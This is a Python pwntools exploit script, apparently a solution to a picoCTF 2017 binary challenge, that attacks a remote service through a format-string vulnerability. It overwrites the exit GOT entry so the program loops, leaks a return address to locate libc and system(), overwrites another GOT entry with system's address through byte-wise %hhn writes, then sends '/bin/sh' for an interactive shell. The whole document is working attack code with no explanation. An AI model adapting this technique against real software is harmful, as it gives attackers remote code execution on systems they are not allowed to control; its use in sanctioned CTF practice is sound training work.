from pwn import *

r = remote("shell2017.picoctf.com",27124)
#r = process(["./console", "/dev/null"])
#r = process(["strace", "-o", "test",  "./console", "/dev/null"])

# Overwrite exit GOT to point to loop
got = "e %189c%22$hhn%76c%23$hhn%55c%24$hhnABC%149$p".ljust(0x40, "A") + p64(0x601258) + p64(0x601259) + p64(0x60125a)

# with open("got", "w") as f:
# 	f.write(got)
r.sendline(got)

r.readuntil("ABC")
print "Overwrite GOT for exit and leak main ret address"
leak = int(r.readuntil("A")[:-1], 16)
libcbase = leak - 0x21b45
system = libcbase + 0x41490
r.readuntil("action: ")

print "main leak: ", hex(leak)
print "libc base: ", hex(libcbase)
# print "magicaddr: ", hex(magaddr)
print "system:    ", hex(system)

payload1 = "e "
payload2 = ""
to_write = p64(system)
addr = 0x601250

prev= 0
ind = 22+0x40/8
for c in to_write:
	if c == "\x00":
		break
	num = ord(c)
	if prev > num:
		# need to roll over
		num += 0x100 
		
	payload1 += "%{}c%{}$hhn".format(num - prev, ind)
	#payload1 += "%{}c%{}$p".format(num - prev, ind)
	payload2 += p64(addr) 

	prev = ord(c) 
	addr += 1
	ind += 1
payload = payload1.ljust(0x80, "A") + payload2
print payload
r.sendline(payload)
r.readuntil("action: ")
r.sendline("/bin/sh")
r.interactive()

